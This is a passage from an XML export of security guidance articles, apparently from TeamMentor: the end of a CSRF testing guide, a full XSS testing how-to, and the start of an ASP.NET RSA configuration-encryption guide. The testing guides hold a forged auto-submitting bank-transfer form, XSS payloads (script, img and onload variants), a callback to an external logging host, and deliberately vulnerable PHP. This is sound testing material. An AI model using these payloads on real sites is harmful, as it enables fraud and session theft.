with the URL parameters passed as hidden input, and add a script to automatically submit the form:&nbsp;</p><pre>&lt;form action="http://bank.com/transfer.do" method="post"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="acct" value="MARIA"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="ammount" value="100000"&gt;<br>&lt;/form&gt; <br>&lt;script&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms[0].submit();<br>&lt;/script&gt;<br></pre></li></ul></li><li>Open an Internet browser and log in to the web application as a legitimate user. </li><li>Open the page built in step 2 (follow the link if necessary). </li><li>Confirm if the request was successful. </li><li>Repeat test case for every application create/update/delete/mail action.</li></ol><p>Expected result:&nbsp; the test fails if the application trusts and processes the forged request.</p><h2><em>Test Use of Secret in URLs</em></h2><p>This test will tell you if your application uses secrets in the URL.</p><p>Testing steps:<strong><em></em></strong></p><ol><li>Log in to the application as a legitimate user. </li><li>Browse to a web form that makes a valid request and uses a secret in the URL:&nbsp; <ul><li><pre>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;secret=2y9ryo2hr2</pre></li></ul></li><li>Start intercepting network traffic using HTTP(s) WebScarab<a href="about:blank#_edn2" name="_ednref2">[ii]</a> proxy. </li><li>Configure browser to use WebScarab proxy. </li><li>Make another request. </li><li>In WebScarab, modify the URL to change the secret to another value: <ul><li><pre>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;secret=<strong>XXXXXXXXXXX</strong></pre></li></ul></li></ol><br><p>Expected result:&nbsp; The server must disallow the action since the secret was changed in step 6.&nbsp; The test fails if the server allows the requested action.</p><p><strong><em></em></strong></p><h2><em>Test Use of Secret in Cookies</em></h2><p>This test will tell you if your application properly uses secrets in the cookies.</p><p>Testing steps:<strong><em></em></strong></p><ol><li>Start intercepting traffic network traffic using WebScarab proxy. </li><li>Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user. </li><li>Browse to a page that makes a request and submits a secret using a cookie. </li><li>Submit request. </li><li>In WebScarab, replace the secret in the cookie.&nbsp; For instance: </li></ol><blockquote><pre>GET http://www.example.com/trasnfer?amount=1000&amp;dest=1234 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14<br>Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br>Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3<br>Accept-Encoding: gzip,deflate<br>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br>Keep-Alive: 300<br>Proxy-Connection: keep-alive<br>Cookie: session-ID=1089eq14; secret=1240u9309u2efija<strong>XXXX</strong><br>&nbsp;</pre></blockquote><p>Expected result:&nbsp; The server must disallow the action since the secret was changed in step 6.&nbsp; The test fails if the server allows the requested action.</p><p>&nbsp;</p><h1>Step 4:&nbsp; Fine-tune Test Case Data</h1><p>The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.&nbsp; &nbsp;Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.</p><h2><em>Fine-tune Test Case Data per objective</em></h2><p>Attackers can use CSRF bugs to execute different kinds of attacks.&nbsp; It is important that you test these different payloads depending the characteristics of your application. Common objectives of &nbsp;CSRF attacks include:</p><ul><li>Making a fraudulent bank transaction. </li><li>Sending spoofed email. </li><li>Exploiting an administrative application. </li><li>Forcing password resets. </li><li>Changing router and firewall configurations [iii].</li></ul><p>&nbsp;</p><h2><em>Automate test cases </em></h2><p>Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.&nbsp; Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.&nbsp; </p><h1>&nbsp;</h1><h1>Conclusions</h1><p>Cross-Site Request Forgery is serious attack class that affects any web application that doesn’t explicitly protect against it.&nbsp; Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.&nbsp;&nbsp; In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.</p><p>&nbsp;</p><p>[i] <strong>Cross-Site Request Forgery</strong>.&nbsp; Wikiepedia. <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p><div><div><p><a href="about:blank#_ednref2" name="_edn2"></a>[ii] <strong>Session Riding -&nbsp; A Widespread Vulnerability in Today Web Applications. </strong>Thomas Scheiber, SecureNet GmbH, Dec 2004. <a href="http://www.securenet.de/papers/Session_Riding.pdf">http://www.securenet.de/papers/Session_Riding.pdf</a></p></div><div><p>&nbsp;</p></div></div>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-10643869" Content_Hash="453831226">
    <Metadata>
      <Id>5d5984a3-ca55-4303-86b3-745e06079f63</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Cross Site Scripting Vulnerabilities</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>XSS bugs affect applications that manipulate HTML input and output.&nbsp; In particular web applications developed in ASP, ASP .NET, PHP, PERL, Java, and Visual Basic.</p><h1>Summary</h1><p>Cross site scripting (or XSS) is a well known HTML-related security vulnerability that commonly affects Internet clients through XSS vulnerable servers.&nbsp; A XSS bug in a web server allows an attacker to send malicious payload to a victim browser such as IE, Firefox, or Netscape through the vulnerable server.&nbsp; &nbsp;Payloads may also execute in other HTTP clients not necessarily focused at browsing the web as long as they render HTML and execute any execute scripts. </p><p>Below is a summary of steps needed for testing for XSS bugs</p><ul><li><strong>Step 1</strong>:&nbsp; Understand XSS attack scenarios </li><li><strong>Step 2</strong>:&nbsp; List high risk components<strong> </strong>and<strong> </strong>entry points </li><li><strong>Step 3</strong>:&nbsp; Start testing and exploring </li><li><strong>Step 4</strong>:&nbsp; Tune test case data</li></ul><p><strong>Step1:&nbsp; Understand XSS Attack Scenarios</strong></p><p>There are two types of XSS: reflective and persistent.&nbsp; A reflective XSS bug occurs when the web server takes input from a visitor and automatically sends him back the input without checking if the data inputted contains a script.&nbsp; Thus, the input data is <em>reflected</em> to the visitor and executes at the visitor's browser.&nbsp;</p><p>A persistent XSS bug is when a script embedded in malicious data is stored in a persistent store such as database, a file, or other storing mechanism.&nbsp; The malicious data containing a script <em>persists</em> in the server.&nbsp;&nbsp; If the server application takes this stored content and sends it to the client without validating its contents, the script will be executed in the browser.&nbsp;</p><p>It is important to understand both XSS attack scenarios to know what to look at when testing.</p><p><strong><em>Reflective XSS through web search form scenario</em></strong></p><p>A web site has a search page named search.php that contains the following form:</p><p><img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image001.png"></p><p>&lt;form&gt;</p><p>&lt;input name="searchInput" type="text" size="50"&gt;</p><p>&lt;input name="searchButton" type="button" size="20" value="search"&gt;</p><p>&lt;/form&gt;</p><p>&nbsp;It collects input using the searchInput variable and shows the results in the same page:</p><p>&nbsp;&lt;p&gt; Search results for &lt;?php echo $_GET['searchInput']?&gt; are:</p><p>&nbsp;The user can type test and will see:</p><p><img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image003.png"></p><p>An attacker can exploit the searchInput variable using the SCRIPT tag and type:</p><p><img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image005.png"></p><p>The server will send the user a page containing a SCRIPT tag and the user browser will execute its contents and display a message box with the word XSS.&nbsp; An attacker can send an email to a victim and tell her to click the following URL:</p><p>http://teammentorexample.com/search/search.php?searchInput=&lt;SCRIPT&gt;payload&lt;/SCRIPT&gt;</p><p>When following the link, the malicious payload executes in the victim browser's context and can be used for stealing session or cookie information.</p><p><strong><em>Persistent XSS through a SQL database server</em></strong></p><p>A web application creates a profile web page by querying a database table and getting profile information from it. The problem is that the database doesn't check for a possible script being stored in the database.&nbsp; To display the user's favorite quote it uses the following PHP code:</p><p>echo 'favorite quote:&nbsp; &lt;br&gt;';</p><p>$connection = odbc_connect("sqldb", "admin", "root");</p><p>$query = "SELECT quote FROM ProfileTable WHERE UserName = " . &nbsp;$_GET['user']"; </p><p>$result = odbc_exec($connection, $query);</p><p>odbc_fetch_row($result);</p><p>$quote = odbc_result($result, 1); </p><p>print($quote);</p><p>An attacker with a profile name of 'JohnB' connected to the database before and set this information in his profile as his favorite quote:</p><p>&lt;SCRIPT&gt;alert('XSS') &lt;/SCRIPT&gt;</p><p>Now, every time that anyone visits the their profile by following a link like this one will see the alert box:</p><p>&nbsp;http://teammentorexample.com/showProfile.php?user=JohnB</p><p>The attacker can modify the alert box with a more dangerous payload such as stealing session or cookie information.</p><p><strong>Step 2: List High Risk Components and Entry Points</strong></p><p><strong><em>Identify high risk components</em></strong></p><p>The next step in testing for XSS bugs is to do an extensive and careful revision of components that take input data from Internet clients and use send it back to the client.&nbsp; In case of large web services, documentation such as design or architectural, if available, become real handy at this point. &nbsp;&nbsp;Testers need to think about what components reflect data to a web client (for reflective XSS) and store data which is later send to a web client (for persistent XSS).&nbsp; Common components that do this include:&nbsp;</p><p>Search web pages</p><p>Profile-related web pages</p><p>Web forums</p><p>Blogs</p><p>RSS feeds</p><p>HTML-based help browsers for thick clients&nbsp;</p><p><strong><em>Look for code that writes HTML responses</em></strong></p><p>There are many different scripting functions that append HTML to the server response.&nbsp; Finding the server-side code that writes data out is the first step evaluating and finding potential XSS issues.&nbsp; Here are some examples of functions that do that:</p><p>Response.Write&nbsp;&nbsp;&nbsp; (ASP)</p><p>&lt;%= %&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ASP)</p><p>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</p><p>print&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</p><p>Functions to write data to a response vary depending on the language and platform you're testing.&nbsp; Be certain that you understand all the relevant functions in the language you're using.</p><p><strong><em>Check for non-validated and unencoded data in responses</em></strong></p><p>Next, check what is being output by the mechanisms above.&nbsp; For example, an application might do this:</p><p>Response.Write(Request.QueryString(search))</p><p>To write the contents of the search value in the URL.&nbsp; If the variable is set to a script it will execute as soon as the client renders the page written.</p><p>The following PHP code doesn't look so harmful at first.&nbsp; </p><p>print($quote);</p><p>However, if the quote variable is a string that directly comes from a database like in the persistent scenario above then it suffers of XSS.</p><p>Look carefully at cases where the output data comes from a back-end though a database or a web method.&nbsp; It might be that a web method returns non-validated data:</p><p>Response.Write(ExternalApplication.GetRSSFeedMethod())</p><p>Even if the data written out by an application comes directly from the user and has not been specifically validated for format, if it is appropriately encoded, it can still be safe.&nbsp; That said, the encoding must take the form of a whitelist of known-safe characters (generally only the alphanumerics), not a blacklist as is commonly attempted.</p><p><strong><em>Match high risk components with entry points</em></strong></p><p>Non-validated data comes from all of the application's entry points, not just the web.&nbsp; Be certain to cover all the possible sources of malicious data which might get passed to a client.&nbsp; Common data sources include:</p><ul><li>Web forms </li><li>URL contents </li><li>Cookie contents </li><li>Flash parameters </li><li>SQL database query contents </li><li>Web service data </li><li>Graphical User Interface</li></ul><p>List the high risk variables in the application and their data sources to make sure that they are covered during review and testing&nbsp;&nbsp;</p><p><img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image007.png"></p><p><strong>Step 3:&nbsp; Start Test and Exploring&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong></p><p>During this step testing is focused at submitting basic XSS fuzz strings and observing how the application reacts, and then trying to display a simple alert box that proves the existence of an XSS bug.</p><p><strong><em>Start with a simple fuzz string</em></strong></p><p>Success in finding XSS bugs depends on whether the tester is able to store or reflect an HTML script in or through the server.&nbsp; In almost all cases scripts are included in between SCRIPT tags (other tags also worked as explained later).&nbsp; During this step, it is recommended to start exploring how the server application's high risk components react to tag related input.&nbsp; A good idea is to start testing a simple fuzz string like this one:</p><p>'&gt;;!--"&gt;&lt;XYZ&gt;&lt;=&amp;{()}</p><p>Then look for the string XYZ in server's response to see how the server processed the special script related characters.&nbsp; It might turn out that the server uses the string inside of a tag:</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line163"></a>"'&gt;;!--"&gt;&lt;<strong>XYZ</strong>&gt;&lt;=&amp;{()}" style="height:10px; color:#000;" /&gt;</p><p>Continue by modifying the initial string to try displaying an alert.&nbsp; The double quotes of the original fuzz string closed the <em>value</em> property so whatever came before doesn't matter.&nbsp; Also, after the closing parenthesis next to the letter Z the string can be anything.&nbsp; Taking the string can be simplified to this:</p><p>"&gt;&lt;XYZ&gt;</p><p>The server might reply with:</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line1631"></a>""&gt;&lt;<strong>XYZ</strong>&gt;" style="height:10px; color:#000;" /&gt;</p><p>To learn more,&nbsp;see the XSS Cheat Sheet at&nbsp;Ha.ckers.com (<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>)</p><p><strong><em>Try to display an alert box</em></strong></p><p>The following goal is to execute a script and the easiest script to test is the one shown in the first scenario that displays an alert box.&nbsp; Note that now the tester knows that the malicious sting needs to start with the "&gt; character, due to where in the HTML document it will appear:</p><p>"&gt;&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>If the server doesn't filter the SCRIPT tags then an alert box will appear.&nbsp; The code sent back to the tester will look like this.</p><p>&lt;<strong>input</strong> type="text" name="keyword" id="keyword" maxlength="255" value=<a name="line16311"></a>""&gt;<span style="text-decoration:underline">&lt;script&gt;alert('Works')&lt;/script&gt;</span>" style="height:10px; color:#000;" /&gt;</p><p><strong><em>Cover different tags</em></strong></p><p>Sometimes severs filter out the string &lt;script&gt; from their output.&nbsp; If the server doesn't allow script tags, try the img tag and put your code in the src property:</p><p>"&gt;&lt;img src="javascript:alert('Works');"&lt;/img&gt;</p><p>In fact, there are many other tags known to be dangerous in some cases, such as &lt;iframe&gt;, &lt;body&gt;, &lt;embed&gt;, &lt;meta&gt;, &lt;html&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;input&gt;, &lt;layer&gt;, &lt;object&gt;, and &lt;style&gt;. </p><p>A good choice is to try the following that doesn't require script tags or the JavaScript command:</p><p>"&gt;&lt;body onload=alert('Works')&gt;</p><p><strong>Step 4:&nbsp; Tune Test Case Data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong></p><p>During this step testing is focused at covering all entry points and tuning test case data based on the format of the specific entry point.&nbsp;&nbsp; </p><p><strong><em>Consider string format and encoding according to entry point</em></strong></p><p>The example in step 3 doesn't specify how the fuzz string was passed to the application (it can be assumed that it was through a web form for these purposes). &nbsp;During this step, testers need to go through their list of components and entry points and modify test case data according to the entry point.&nbsp; Make sure that all entry points are covered.</p><p><strong><em>Web Forms</em></strong></p><p>Web forms are the easiest to test since they commonly allow only ASCII strings.&nbsp; To test through this entry point, just go through the high risk component list looking for ones that have web forms.&nbsp; Then use a web browser to submit test strings to the components via the forms, and possibly an attack proxy like Burp Suite to circumvent any client-side JavaScript used for data validation.</p><p><strong><em>URL Contents</em></strong></p><p>A web application is vulnerable to XSS through the value passed in the password variable:&nbsp;</p><p>http://www.xvulnerablesite.com/login.asp?username=[value]&amp;password=[value]</p><p>If testers want to test the following string in the password value:&nbsp;</p><p>&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>They will need to modify the above URL in this way:</p><p>http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;script&gt;alert('Works')&lt;/script&gt;</p><p>When executing test cases through the URL it is important to try different encodings of the test string.&nbsp;&nbsp; For instance, one can execute the first attack string below and it causes no effect.&nbsp; Then execute the second one and the alert box works.&nbsp; In this case the web application didn't allow the symbol characters (except the round brackets) in ASCII but did in their hexadecimal encodings:&nbsp;</p><p>&lt;img src="javascript:alert('Works');"&gt;</p><p>&nbsp;http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;img%20src%3d%22javascript:alert(%27Works%27)%22&gt;</p><p>When testing through the URL and sometimes in other places, it is necessary to investigate what type of encodings the server is using and modify test cases according to them.</p><p><strong><em>Cookie contents</em></strong></p><p>Sometimes the application blindly displays the contents of a cookie in the web browser such as showed in the following PHP code:</p><p>&lt;?php&nbsp; echo $_COOKIE["testcookie"]; ?&gt;</p><p>To test the risky component through this entry point we have to modify the cookie file in disk and try to inject a simple script:</p><p><img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image009.png"></p><p>Then restart the browser and navigate to the page containing the PHP code to see if an alert box appears.&nbsp; Alternately, an attack proxy can be used to perform this modification on the fly, which is especially helpful in the case of complicated applications.</p><p><strong><em>Flash Parameters</em></strong></p><p>Since Flash parameters are frequently passed in the URL, testing Flash parameters is similar to testing URL contents.&nbsp; Here, it is necessary to go through each parameter in the URL and see how the application reacts.&nbsp; Flash also frequently receives parameters using <strong>FlashVars</strong>.&nbsp; Consider the following code to load a Flash movie:</p><p>&nbsp;&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</p><p>&nbsp;codebase=""http://macromedia.com/cabs/swflash.cab#version=6,0,0,0""</p><p>&nbsp;width="250" height="250" id="flaMovie1" align="center"&gt;</p><p>&nbsp;&lt;param name=movie value="flaMovie1.swf"&gt;</p><p>&nbsp;&lt;param name=<strong>FlashVars</strong> value=<strong>"inputURL=usersinput"</strong>&gt; </p><p>&nbsp;&lt;param name=quality value=high&gt; </p><p>&nbsp;&lt;param name=bgcolor value=#ffffff&gt; </p><p>&nbsp;&lt;embed src="flaMovie1.swf" <strong>FlashVars</strong>=<strong>"inputURL=usersinput"</strong> </p><p>&nbsp; quality="high" bgcolor="#ffffff" width="250" height="250" </p><p>&nbsp; name="flaMovie1" align type="application/x-shockwave-flash" </p><p>&nbsp; pluginspage="http://www.macromedia.com/go/getflashplayer"&gt;</p><p>&lt;/object&gt;</p><p>&nbsp;During this step, testers will need to change the entry parameters to Flash like this:</p><p>&nbsp;&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</p><p>&nbsp;codebase=""http://macromedia.com/cabs/swflash.cab#version=6,0,0,0""</p><p>&nbsp;width="250" height="250" id="flaMovie1" align="CENTER"&gt;</p><p>&nbsp;&lt;param name=movie value="flaMovie1.swf"&gt;</p><p>&nbsp;&lt;param name=<strong>FlashVars</strong> value=<strong>"inputURL=%3cscript%3ealart%28%b4XSS%b4%29%3c%2fscript%3e"</strong>&gt; </p><p>&nbsp;&lt;param name=quality value=high&gt; </p><p>&nbsp;&lt;para name=bgcolor value=#ffffff&gt; </p><p>&nbsp;&lt;embed src="flaMovie1.swf" <strong>FlashVars</strong>=<strong>"inputURL=%3CSCRIPT%3Ealert%28%B4XSS%B4%29%3C%2FSCRIPT%3E"</strong> </p><p>&nbsp; quality="high" bgcolor="#ffffff" width="250" height="250" </p><p>&nbsp; name="flaMovie1" align type="application/x-shockwave-flash" </p><p>&nbsp; pluginspage="http://www.macromedia.com/go/getflashplayer"&gt;</p><p>&lt;/object&gt;</p><p><strong><em>Graphical User Interface</em></strong></p><p>Testing through the UI is similar to web form testing in that the tester enters test values&nbsp; directly to the screen.&nbsp; In the case of GUI testing the application used is not a web browser but any other application that interacts with high risk components, renders HTML,&nbsp; and that allows user input or otherwise receives untrusted data.<strong></strong></p><p><strong><em>Look for additional entry points</em></strong></p><p>Each application has its own set of entry points.&nbsp; This article lists the common ones for XSS attacks.&nbsp; Nonetheless, testers must explore their application for additional ways of passing data that might make it into a XSS vulnerability.&nbsp; It is recommended to use system monitoring tools such as the ones from www.sysinternals.com and dedicated attack tools such as Burp proxy that lets you intercept and add match-and-replace rules to change the contents of HTTP packets.</p><p><strong><em>Keep tuning test cases </em></strong></p><p>Sometimes the initial test string can land in a part of the source code where XSS is possible without using a script tag.&nbsp; The tester may be able to pad it a little or maybe just write the JavaScript command.&nbsp; Always check if the initial input lands inside or within an actual command or parameter.</p><p>Tags have different ways of modifying them for script injection.&nbsp; To learn more about testing web applications for Cross-Site Scripting Vulnerabilities, see <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx">http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx</a>&nbsp;and&nbsp; <a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors">http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors</a>.</p><p><strong><em>Consider the case of persistent XSS</em></strong></p><p>Sometimes the tester won't see the results of test cases right away.&nbsp; An XSS bug might exist that takes malicious input and only sends it back if the attacker does something else like visiting another page, for instance.&nbsp; Such is often the case with a persistent XSS attack.</p><p>Consider the following case.&nbsp; An application asks for a user's password hint.&nbsp; When the server prompts the user for the hint, the attacker types one of the XSS test strings described before.&nbsp; Then submits the registration but the server doesn't show the alert box.&nbsp; Then the attacker has the victim browse the site's password page and ask for the hint.&nbsp; When the site displays the hint the alert box appears.&nbsp; </p><p>While testing persistent XSS, testers must think of all the places where the input might end up and check all of them.&nbsp; They should talk to developers and use specifications to check all data stores where a persistent XSS bug can manifest.</p><p><strong><em>Automating test cases</em></strong></p><p>One can automate XSS testing by setting up a server that collects any successful XSS attacks.&nbsp; For instance, can create an ASP page that has the following code, and name the page results.asp</p><p>&lt;%<br>&nbsp;&nbsp; set fso = Server.CreateObject("Scripting.FileSystemObject")<br>&nbsp;&nbsp; set fw = fso.CreateTextFile("c:\inetpub\wwwroot\results.txt",True)<br>&nbsp;&nbsp; fw.WriteLine("test case:")<br>&nbsp;&nbsp; fw.WriteLine(Request.QueryString("testcase"))&nbsp;&nbsp; <br>&nbsp;&nbsp; fw.Close <br>%&gt;</p><p>&nbsp;Then generate test cases by modifying or creating new HTTP requests to the target server.&nbsp; Instead of displaying alert the script invokes results.asp passing its corresponding test case number (using the src property of HTML tags).&nbsp; For example the tester wants to cover XSS through the img tag in the password field of the login page.&nbsp; He labels this test case number 17.&nbsp; Then passes the following string using automation:</p><p>http://www.xvulnerablesite.com/login.asp?username=any&amp;password=&lt;img src="http://xyoursite.com/results.asp?testcase=17"&gt;</p><p>&nbsp;If this test case fails then the value 17 appears in the results.txt file and the tester knows that a XSS bug was found and what caused it.&nbsp; Testers can code hundreds of test cases like this and a test generator like an HTTP client to guide the automation.&nbsp;</p><p>In addition, look at the different fuzzers available for free at <a href="http://en.wikipedia.org/wiki/Fuzz_testing">http://en.wikipedia.org/wiki/Fuzz_testing</a>.&nbsp; Many of these have the capability of executing XSS test cases and help in uncovering vulnerabilities.</p><h1>Conclusions</h1><p>Testing for XSS bugs is not complicated but you need to be thorough.&nbsp; It is important that you go through all the places where your web server renders HTML output.&nbsp; There are many strings to try, many tags to look at, different methods to feed the test data, and even room for automation.&nbsp; However, the most important thing to keep in mind is to follow your test data.&nbsp; Don't just look for the alert box, but look at the code that comes back to you.&nbsp; Successful XSS testing is all about knowing how to tune you test case data.</p><h1>Additional Resources&nbsp;</h1><ul><li>XSS (Cross Site Scripting) Cheat Sheet.&nbsp; Ha.ckers.com (<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>) </li><li>Testing Your Web Applications for Cross-Site Scripting Vulnerabilities, Chris Weber. <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx">http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx</a>&nbsp; </li><li>OWASP Testing Guide Appendix C: Fuzz Vectors. <a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors">http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors</a> </li><li>&nbsp;Fuzz Testing.&nbsp; Wikipedia. <a href="http://en.wikipedia.org/wiki/Fuzz_testing">http://en.wikipedia.org/wiki/Fuzz_testing</a>&nbsp;</li></ul><h1>Related Items</h1><div><ul><li><div>&nbsp;<a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a></div></li></ul></div>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-159416451" Content_Hash="1089730522">
    <Metadata>
      <Id>634d908c-b966-40d6-a87b-1cb465af6684</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Encrypt Configuration Sections in ASP.NET Using RSA</Title>
      <Category>Configuration</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>This How to shows how to use the RSA Protected Configuration provider and the Aspnet_regiis.exe tool to encrypt sections of your configuration files. You can use Aspnet_regiis.exe tool to encrypt sensitive data, such as connection strings, held in the Web.config and Machine.config files. You can easily export and import RSA keys from server to server. This makes RSA encryption particularly effective for encrypting configuration files used on multiple servers in a Web farm.</p><h1>Contents</h1><ul><li>Objectives </li><li>Overview </li><li>Summary of Steps </li><li>Step 1. Identify the Configuration Sections to Be Encrypted </li><li>Step 2. Choose Machine-Level or User-Level Containers </li><li>Step 3. Encrypt Your Configuration File Data </li><li>Web Farm Scenarios </li><li>Additional Resources </li></ul><h1>Objectives</h1><ul><li>Learn about key changes for encrypting sensitive data in configuration files in ASP.NET. </li><li>Learn how to choose between machine-level and user-level containers. </li><li>Know which sections can and cannot be encrypted with the RSA protected configuration provider. </li><li>Use the RSA protected configuration provider to encrypt connection strings. </li><li>Create RSA key containers. </li><li>Import and export RSA keys across multiple servers in a Web farm. </li></ul><h1>Overview</h1><p>Configuration files such as the Web.config file are often used to hold sensitive information, including user names, passwords, database connection strings, and encryption keys. The sections that usually contain sensitive information that you need to encrypt are the following:</p><ul><li>&lt;appSettings&gt;. This section contains custom application settings. </li><li>&lt;connectionStrings&gt;. This section contains connection strings. </li><li>&lt;identity&gt;. This section can contain impersonation credentials. </li><li>&lt;sessionState&gt;. This section contains the connection string for the out-of-process session state provider. </li></ul><p>Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.</p><h1>Summary of Steps</h1><p>To encrypt configuration sections by using the RSA protected configuration provider, perform the following steps:</p><ul><li>Step 1. Identify the configuration sections to be encrypted. </li><li>Step 2. Choose machine-level or user-level key containers. </li><li>Step 3. Encrypt your configuration file data. </li></ul><h1>Step 1. Identify the Configuration Sections to Be Encrypted</h1><p>Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.</p><h2>Sections You Cannot Encrypt Using Protected Configuration</h2><p>If you store sensitive data in any of the following configuration sections, you cannot encrypt it by using a protected configuration provider and the Aspnet_regiis.exe tool:</p><ul><li>&lt;processModel&gt; </li><li>&lt;runtime&gt; </li><li>&lt;mscorlib&gt; </li><li>&lt;startup&gt; </li><li>&lt;system.runtime.remoting&gt; </li><li>&lt;configProtectedData&gt; </li><li>&lt;satelliteassemblies&gt; </li><li>&lt;cryptographySettings&gt; </li><li>&lt;cryptoNameMapping&gt; </li><li>&lt;cryptoClasses&gt; </li></ul><p>For the configuration sections listed, you should use the Aspnet_setreg.exe tool, which is also available for previous versions of the .NET Framework.</p><h1>Step 2. Choose Machine-Level or User-Level Key Containers</h1><p>The <strong>RSAProtectedConfigurationProvider</strong> supports machine-level and user-level key containers for key storage. Machine-level key containers are available to all users, but a user-level key container is available to that user only.</p><p>The choice of container depends largely on whether or not your application shares a server with other applications and whether or not sensitive data must be kept private for each application.</p><h2>Machine Key Container</h2><p>Use a machine-level key container in the following situations: </p><ul><li>Your application runs on its own dedicated server with no other applications. </li><li>You have multiple applications on the same server and you want those applications to be able to share sensitive information and the same encryption key. </li></ul><p>RSA machine key containers are stored in the following folder: </p><p>\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys</p><h2>User Key Container</h2><p>Use a user-level key container if you run your application in a shared hosting environment and you want to make sure that your application's sensitive data is not accessible to other applications on the server. In this situation, each application should have a separate identity and the resources for the application—such as files, and databases—should be restricted to that 